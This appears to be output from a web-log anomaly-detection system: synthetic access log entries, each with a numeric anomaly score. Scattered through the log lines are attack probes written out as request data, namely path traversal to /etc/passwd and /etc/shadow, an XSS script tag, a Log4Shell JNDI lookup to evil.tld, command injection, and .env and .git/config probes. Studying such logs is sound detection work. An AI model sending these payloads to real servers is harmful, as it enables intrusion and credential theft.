score_content,score_session,score_fused,line
6.405821323394775,,6.405821323394775,{"remote_addr": "5.203.68.100", "time_local": "11/Jan/2025:09:07:01 -0700", "request": "POST /contact HTTP/2", "status": 301, "body_bytes_sent": 12585, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
101.57195281982422,,101.57195281982422,{"remote_addr": "49.76.122.146", "time_local": "11/Jan/2025:09:07:01 -0700", "request": "TRACE /index.html HTTP/2", "status": 201, "body_bytes_sent": 15389, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
50.64039611816406,,50.64039611816406,{"remote_addr": "125.193.145.173", "time_local": "11/Jan/2025:09:07:02 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 5250, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
12.632787704467773,,12.632787704467773,{"remote_addr": "57.138.30.150", "time_local": "11/Jan/2025:09:07:02 -0700", "request": "PUT /api/products HTTP/2", "status": 200, "body_bytes_sent": 2520, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
12.807799339294434,,12.807799339294434,{"remote_addr": "22.181.186.144", "time_local": "11/Jan/2025:09:07:03 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 15322, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
48.53701400756836,,48.53701400756836,{"remote_addr": "118.200.122.209", "time_local": "11/Jan/2025:09:07:04 -0700", "request": "HEAD /logout HTTP/2", "status": 302, "body_bytes_sent": 5514, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
102.86784362792969,,102.86784362792969,{"remote_addr": "202.77.75.158", "time_local": "11/Jan/2025:09:07:05 -0700", "request": "TRACE /contact HTTP/2", "status": 204, "body_bytes_sent": 17348, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
1.5569705963134766,,1.5569705963134766,{"remote_addr": "163.171.51.86", "time_local": "11/Jan/2025:09:07:06 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 1620, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
50.762203216552734,,50.762203216552734,{"remote_addr": "45.7.159.138", "time_local": "11/Jan/2025:09:07:07 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10296, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
0.3079144060611725,,0.3079144060611725,{"remote_addr": "27.213.122.227", "time_local": "11/Jan/2025:09:07:07 -0700", "request": "GET /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 15981, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
3.010606527328491,,3.010606527328491,{"remote_addr": "134.47.124.233", "time_local": "11/Jan/2025:09:07:08 -0700", "request": "POST /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 11875, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
10.622431755065918,,10.622431755065918,{"remote_addr": "119.224.160.164", "time_local": "11/Jan/2025:09:07:08 -0700", "request": "POST /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 8012, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
50.69771957397461,,50.69771957397461,{"remote_addr": "93.216.118.94", "time_local": "11/Jan/2025:09:07:09 -0700", "request": "HEAD /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16857, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.0133674144744873,,3.0133674144744873,{"remote_addr": "2.227.203.5", "time_local": "11/Jan/2025:09:07:10 -0700", "request": "POST /.git/config HTTP/2", "status": 200, "body_bytes_sent": 958, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
2.8130483627319336,,2.8130483627319336,{"remote_addr": "41.163.254.33", "time_local": "11/Jan/2025:09:07:11 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3025, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
4.3924479484558105,,4.3924479484558105,{"remote_addr": "166.141.36.224", "time_local": "11/Jan/2025:09:07:12 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 2586, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.872031331062317,,1.872031331062317,{"remote_addr": "31.74.141.175", "time_local": "11/Jan/2025:09:07:13 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 5836, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
102.89852905273438,,102.89852905273438,{"remote_addr": "65.68.97.29", "time_local": "11/Jan/2025:09:07:13 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 4048, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
50.663455963134766,,50.663455963134766,{"remote_addr": "89.223.55.53", "time_local": "11/Jan/2025:09:07:14 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12002, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
72.75054168701172,,72.75054168701172,{"remote_addr": "12.34.247.91", "time_local": "11/Jan/2025:09:07:15 -0700", "request": "OPTIONS /.env HTTP/2", "status": 302, "body_bytes_sent": 4347, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
105.00077819824219,,105.00077819824219,{"remote_addr": "145.156.190.86", "time_local": "11/Jan/2025:09:07:16 -0700", "request": "TRACE /about HTTP/2", "status": 304, "body_bytes_sent": 11238, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
0.2491065412759781,,0.2491065412759781,{"remote_addr": "176.241.101.138", "time_local": "11/Jan/2025:09:07:17 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 11228, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
8.637505531311035,,8.637505531311035,{"remote_addr": "200.212.54.219", "time_local": "11/Jan/2025:09:07:17 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 17671, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.217238426208496,,4.217238426208496,{"remote_addr": "108.209.111.234", "time_local": "11/Jan/2025:09:07:18 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 17779, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
87.06149291992188,,87.06149291992188,{"remote_addr": "166.142.39.45", "time_local": "11/Jan/2025:09:07:18 -0700", "request": "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/2", "status": 403, "body_bytes_sent": 726, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
11.266582489013672,,11.266582489013672,{"remote_addr": "65.80.143.99", "time_local": "11/Jan/2025:09:07:19 -0700", "request": "GET /assets/app.js HTTP/2", "status": 401, "body_bytes_sent": 1289, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
50.6314582824707,,50.6314582824707,{"remote_addr": "180.138.185.177", "time_local": "11/Jan/2025:09:07:20 -0700", "request": "HEAD /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8041, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
13.439284324645996,,13.439284324645996,{"remote_addr": "7.133.158.230", "time_local": "11/Jan/2025:09:07:20 -0700", "request": "PUT /wp-login.php HTTP/2", "status": 304, "body_bytes_sent": 3998, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
0.222368523478508,,0.222368523478508,{"remote_addr": "102.46.117.16", "time_local": "11/Jan/2025:09:07:21 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3460, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
16.92202377319336,,16.92202377319336,{"remote_addr": "70.175.156.250", "time_local": "11/Jan/2025:09:07:21 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 9600, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
16.909893035888672,,16.909893035888672,{"remote_addr": "71.1.144.105", "time_local": "11/Jan/2025:09:07:22 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 6179, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
5.852278232574463,,5.852278232574463,{"remote_addr": "99.114.218.4", "time_local": "11/Jan/2025:09:07:22 -0700", "request": "GET /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 10931, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
12.952459335327148,,12.952459335327148,{"remote_addr": "80.83.146.220", "time_local": "11/Jan/2025:09:07:24 -0700", "request": "PUT / HTTP/2", "status": 200, "body_bytes_sent": 1727, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.5796605348587036,,1.5796605348587036,{"remote_addr": "51.132.99.136", "time_local": "11/Jan/2025:09:07:24 -0700", "request": "GET /api/products HTTP/2", "status": 200, "body_bytes_sent": 13252, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
5.815700531005859,,5.815700531005859,{"remote_addr": "17.189.64.84", "time_local": "11/Jan/2025:09:07:25 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 1201, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
107.10281372070312,,107.10281372070312,{"remote_addr": "75.111.165.188", "time_local": "11/Jan/2025:09:07:25 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 17537, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
50.70278549194336,,50.70278549194336,{"remote_addr": "34.179.40.85", "time_local": "11/Jan/2025:09:07:27 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 4504, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
45.050045013427734,,45.050045013427734,{"remote_addr": "128.217.88.158", "time_local": "11/Jan/2025:09:07:28 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 15399, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
70.37633514404297,,70.37633514404297,{"remote_addr": "120.31.17.46", "time_local": "11/Jan/2025:09:07:28 -0700", "request": "OPTIONS /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 3918, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
12.539926528930664,,12.539926528930664,{"remote_addr": "248.235.252.73", "time_local": "11/Jan/2025:09:07:29 -0700", "request": "PUT /server-status HTTP/2", "status": 204, "body_bytes_sent": 4289, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
19.014928817749023,,19.014928817749023,{"remote_addr": "184.126.242.141", "time_local": "11/Jan/2025:09:07:30 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 13380, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
45.330020904541016,,45.330020904541016,{"remote_addr": "252.83.81.212", "time_local": "11/Jan/2025:09:07:31 -0700", "request": "HEAD /.env HTTP/2", "status": 200, "body_bytes_sent": 1407, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
16.81602668762207,,16.81602668762207,{"remote_addr": "137.91.70.243", "time_local": "11/Jan/2025:09:07:32 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 400, "body_bytes_sent": 875, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
1.577034831047058,,1.577034831047058,{"remote_addr": "177.196.146.226", "time_local": "11/Jan/2025:09:07:33 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 9021, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
16.875423431396484,,16.875423431396484,{"remote_addr": "248.122.141.100", "time_local": "11/Jan/2025:09:07:33 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 16405, "http_referer": "-", "http_user_agent": "dirb/2.22"}
58.20399475097656,,58.20399475097656,{"remote_addr": "245.87.15.10", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "HEAD /contact HTTP/2", "status": 429, "body_bytes_sent": 1084, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
26.759538650512695,,26.759538650512695,{"remote_addr": "167.151.77.151", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "DELETE /contact HTTP/2", "status": 200, "body_bytes_sent": 8737, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
16.906471252441406,,16.906471252441406,{"remote_addr": "178.176.94.241", "time_local": "11/Jan/2025:09:07:34 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5236, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.286877155303955,,4.286877155303955,{"remote_addr": "45.31.230.102", "time_local": "11/Jan/2025:09:07:35 -0700", "request": "POST /api/products HTTP/2", "status": 200, "body_bytes_sent": 11041, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
76.06204986572266,,76.06204986572266,{"remote_addr": "74.180.3.226", "time_local": "11/Jan/2025:09:07:36 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 2069, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
50.67628479003906,,50.67628479003906,{"remote_addr": "74.185.69.149", "time_local": "11/Jan/2025:09:07:37 -0700", "request": "HEAD /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 9695, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
5.827620983123779,,5.827620983123779,{"remote_addr": "146.83.205.163", "time_local": "11/Jan/2025:09:07:38 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7741, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
5.817007064819336,,5.817007064819336,{"remote_addr": "36.184.230.94", "time_local": "11/Jan/2025:09:07:38 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10134, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
4.363041400909424,,4.363041400909424,{"remote_addr": "171.111.118.8", "time_local": "11/Jan/2025:09:07:39 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 3976, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
1.9030135869979858,,1.9030135869979858,{"remote_addr": "245.216.25.69", "time_local": "11/Jan/2025:09:07:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 15266, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
109.09512329101562,,109.09512329101562,{"remote_addr": "27.25.73.143", "time_local": "11/Jan/2025:09:07:41 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 302, "body_bytes_sent": 7688, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.8279027938842773,,2.8279027938842773,{"remote_addr": "78.168.142.57", "time_local": "11/Jan/2025:09:07:42 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 7486, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.6537543535232544,,1.6537543535232544,{"remote_addr": "181.100.2.42", "time_local": "11/Jan/2025:09:07:43 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 5397, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30.950456619262695,,30.950456619262695,{"remote_addr": "87.54.37.6", "time_local": "11/Jan/2025:09:07:43 -0700", "request": "DELETE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 14403, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
107.0304183959961,,107.0304183959961,{"remote_addr": "145.208.138.159", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 11272, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
45.11885070800781,,45.11885070800781,{"remote_addr": "69.216.125.37", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 10423, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
11.390151023864746,,11.390151023864746,{"remote_addr": "100.47.244.18", "time_local": "11/Jan/2025:09:07:44 -0700", "request": "PUT /.git/config HTTP/2", "status": 200, "body_bytes_sent": 909, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
45.18064498901367,,45.18064498901367,{"remote_addr": "66.15.96.130", "time_local": "11/Jan/2025:09:07:45 -0700", "request": "HEAD /index.html HTTP/2", "status": 200, "body_bytes_sent": 14192, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
26.775535583496094,,26.775535583496094,{"remote_addr": "106.192.108.53", "time_local": "11/Jan/2025:09:07:46 -0700", "request": "DELETE /logout HTTP/2", "status": 200, "body_bytes_sent": 4349, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
2.9304888248443604,,2.9304888248443604,{"remote_addr": "235.218.74.32", "time_local": "11/Jan/2025:09:07:47 -0700", "request": "POST /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 13053, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
70.33181762695312,,70.33181762695312,{"remote_addr": "50.231.139.22", "time_local": "11/Jan/2025:09:07:47 -0700", "request": "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 16279, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
0.289520263671875,,0.289520263671875,{"remote_addr": "185.98.204.252", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2398, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
28.819110870361328,,28.819110870361328,{"remote_addr": "59.136.204.201", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "DELETE /profile HTTP/2", "status": 301, "body_bytes_sent": 11929, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.212186336517334,,3.212186336517334,{"remote_addr": "53.243.193.203", "time_local": "11/Jan/2025:09:07:48 -0700", "request": "POST /.env HTTP/2", "status": 204, "body_bytes_sent": 5199, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
26.74510955810547,,26.74510955810547,{"remote_addr": "149.84.94.161", "time_local": "11/Jan/2025:09:07:50 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 4610, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
46.28804016113281,,46.28804016113281,{"remote_addr": "222.25.126.97", "time_local": "11/Jan/2025:09:07:51 -0700", "request": "HEAD /server-status HTTP/2", "status": 200, "body_bytes_sent": 5020, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
107.10250854492188,,107.10250854492188,{"remote_addr": "152.34.3.34", "time_local": "11/Jan/2025:09:07:52 -0700", "request": "TRACE /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 8553, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
12.707253456115723,,12.707253456115723,{"remote_addr": "89.132.164.150", "time_local": "11/Jan/2025:09:07:52 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1316, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
5.8260273933410645,,5.8260273933410645,{"remote_addr": "15.11.88.209", "time_local": "11/Jan/2025:09:07:53 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 12975, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
102.67249298095703,,102.67249298095703,{"remote_addr": "46.252.94.36", "time_local": "11/Jan/2025:09:07:53 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1968, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
83.1788101196289,,83.1788101196289,{"remote_addr": "178.89.127.126", "time_local": "11/Jan/2025:09:07:54 -0700", "request": "OPTIONS / HTTP/2", "status": 404, "body_bytes_sent": 447, "http_referer": "-", "http_user_agent": "dirb/2.22"}
1.658990502357483,,1.658990502357483,{"remote_addr": "141.32.128.93", "time_local": "11/Jan/2025:09:07:55 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 16692, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
5.816373348236084,,5.816373348236084,{"remote_addr": "40.212.122.64", "time_local": "11/Jan/2025:09:07:55 -0700", "request": "GET /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 9944, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
107.04468536376953,,107.04468536376953,{"remote_addr": "50.77.37.99", "time_local": "11/Jan/2025:09:07:56 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 6106, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
26.763769149780273,,26.763769149780273,{"remote_addr": "143.28.206.146", "time_local": "11/Jan/2025:09:07:56 -0700", "request": "DELETE /profile HTTP/2", "status": 200, "body_bytes_sent": 9998, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
46.508419036865234,,46.508419036865234,{"remote_addr": "17.66.216.180", "time_local": "11/Jan/2025:09:07:57 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 4295, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
4.338116645812988,,4.338116645812988,{"remote_addr": "125.120.2.160", "time_local": "11/Jan/2025:09:07:57 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 910, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
5.779417037963867,,5.779417037963867,{"remote_addr": "96.108.92.169", "time_local": "11/Jan/2025:09:07:58 -0700", "request": "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 14549, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
16.853639602661133,,16.853639602661133,{"remote_addr": "35.28.2.139", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "PUT /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 9282, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.5395419001579285,,0.5395419001579285,{"remote_addr": "55.184.178.133", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "GET /.env HTTP/2", "status": 201, "body_bytes_sent": 16108, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.2334577888250351,,0.2334577888250351,{"remote_addr": "163.89.138.10", "time_local": "11/Jan/2025:09:07:59 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 6688, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
4.578464031219482,,4.578464031219482,{"remote_addr": "194.105.160.236", "time_local": "11/Jan/2025:09:08:00 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 3590, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
674.83349609375,,674.83349609375,{"remote_addr": "164.98.175.190", "time_local": "11/Jan/2025:09:08:01 -0700", "request": "TRACE /search?q=router HTTP/2", "status": 500, "body_bytes_sent": 599, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
46.51276779174805,,46.51276779174805,{"remote_addr": "159.143.101.180", "time_local": "11/Jan/2025:09:08:01 -0700", "request": "HEAD /about HTTP/2", "status": 200, "body_bytes_sent": 5557, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
5.093442916870117,,5.093442916870117,{"remote_addr": "75.120.173.11", "time_local": "11/Jan/2025:09:08:02 -0700", "request": "POST /.git/config HTTP/2", "status": 304, "body_bytes_sent": 5887, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
30.954143524169922,,30.954143524169922,{"remote_addr": "127.120.252.249", "time_local": "11/Jan/2025:09:08:02 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 9521, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
71.73174285888672,,71.73174285888672,{"remote_addr": "68.104.15.251", "time_local": "11/Jan/2025:09:08:03 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 201, "body_bytes_sent": 3401, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.38956069946289,,46.38956069946289,{"remote_addr": "68.235.172.87", "time_local": "11/Jan/2025:09:08:03 -0700", "request": "HEAD /dashboard HTTP/2", "status": 200, "body_bytes_sent": 5343, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.430139541625977,,4.430139541625977,{"remote_addr": "8.131.241.213", "time_local": "11/Jan/2025:09:08:04 -0700", "request": "POST /login HTTP/2", "status": 200, "body_bytes_sent": 14259, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
109.10663604736328,,109.10663604736328,{"remote_addr": "161.130.203.190", "time_local": "11/Jan/2025:09:08:05 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 302, "body_bytes_sent": 11101, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
